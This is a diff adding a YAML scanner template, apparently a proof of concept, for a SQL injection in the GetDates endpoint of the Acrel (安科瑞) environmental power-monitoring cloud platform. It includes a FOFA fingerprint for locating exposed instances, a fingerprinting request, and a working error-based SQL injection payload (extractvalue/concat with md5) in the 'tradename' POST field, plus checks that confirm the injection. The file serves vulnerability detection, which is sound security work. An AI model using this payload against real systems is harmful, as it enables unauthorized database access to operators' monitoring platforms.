@@ -1,0 +1,24 @@
+id: poc-yaml-acreldny-getdates-sqli
+info:
+  name: 安科瑞环保用电监管云平台 GetDates SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 安科瑞环保用电监管云平台
+  fofa: body="myCss/phone.css"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && ( contains(body,"myCss/phone.css")|| contains(body,"/signInIcon/iconfont.css")
+    )
+- method: POST
+  path: /MainMonitor/GetEnterpriseInfoMapByDate/GetDates
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: userid=admin&state=1&time=2025-12-29&tradename=1'+and+extractvalue(1,concat(0x7e,md5({{.t1}}),0x7e))--+-
+  expression: status_code == 200 && contains(body,"系统异常") && contains(body,"XPATH
+    syntax error") && contains(body,substr(t2,0,31))
+transport: http
